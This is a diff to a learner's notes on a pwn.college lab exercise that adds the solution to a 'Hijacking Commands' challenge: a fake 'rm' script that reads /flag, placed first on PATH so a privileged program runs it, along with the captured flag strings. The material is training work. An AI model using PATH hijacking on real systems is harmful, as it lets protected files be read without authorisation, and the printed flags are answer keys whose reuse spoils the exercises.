@@ -73,19 +73,29 @@ echo $flag
 ### Flag: pwn.college{AJM2F4gcRar4tmHpvXBqDFNmgeW.dZzNyUDL1ADO0czW}
 <br>
 
-##
+## Hijacking Commands
 
-### Lesson:
+### Lesson: Learned how to hijack commands. Had to take a lot of help for this one. 
 
 <br>
 
 ### Code:
 ```
-
+hacker@path~hijacking-commands:~$ $flag
+hacker@path~hijacking-commands:~$ nano rm
+hacker@path~hijacking-commands:~$ chmod +x rm
+hacker@path~hijacking-commands:~$ PATH=/home/hacker
+hacker@path~hijacking-commands:~$ /challenge/run
+Trying to remove /flag...
+pwn.college{MckbCgMEnXbMNA0bE_M5obvRjc-.ddzNyUDL1ADO0czW}
 ```
-
+Inside the shell script:
+```
+read flag  < /flag
+echo $flag
+```
 <br>
 
-### Flag: 
+### Flag: pwn.college{MckbCgMEnXbMNA0bE_M5obvRjc-.ddzNyUDL1ADO0czW}
 <br>
 
